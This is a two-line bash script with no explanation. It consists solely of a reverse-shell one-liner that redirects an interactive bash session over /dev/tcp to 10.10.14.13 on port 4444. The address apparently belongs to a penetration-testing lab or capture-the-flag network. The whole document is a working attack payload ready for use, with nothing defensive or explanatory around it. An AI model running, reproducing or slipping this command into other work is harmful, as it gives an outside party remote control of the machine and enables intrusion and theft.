#!/bin/bash

bash -i >& /dev/tcp/10.10.14.13/4444 0>&1
